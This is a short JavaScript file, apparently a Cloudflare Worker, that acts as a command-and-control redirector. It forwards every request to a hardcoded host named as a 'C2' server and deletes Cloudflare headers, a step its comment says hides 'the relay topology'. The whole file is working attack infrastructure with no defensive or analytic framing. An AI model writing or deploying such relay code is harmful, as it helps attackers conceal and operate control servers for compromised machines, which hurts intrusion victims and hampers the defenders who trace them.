addEventListener('fetch', event => {
  event.respondWith(handleRelay(event.request))
})

const C2_ORIGIN = 'https://real-c2-server.example.com'

async function handleRelay(request) {
  const targetURL = new URL(request.url)
  targetURL.hostname = new URL(C2_ORIGIN).hostname
  targetURL.protocol = 'https:'

  const fwdHeaders = new Headers(request.headers)

  const cfIP = request.headers.get('CF-Connecting-IP')
  if (cfIP) {
    fwdHeaders.set('X-Forwarded-For', cfIP)
  }

  /* Strip CF-specific headers that would leak the relay topology */
  fwdHeaders.delete('CF-Connecting-IP')
  fwdHeaders.delete('CF-IPCountry')
  fwdHeaders.delete('CF-RAY')
  fwdHeaders.delete('CF-Visitor')

  const proxyReq = new Request(targetURL.toString(), {
    method:  request.method,
    headers: fwdHeaders,
    body:    request.body,
  })

  try {
    return await fetch(proxyReq)
  } catch (err) {
    return new Response(JSON.stringify({ error: 'upstream_unavailable' }), {
      status: 502,
      headers: { 'Content-Type': 'application/json' }
    })
  }
}
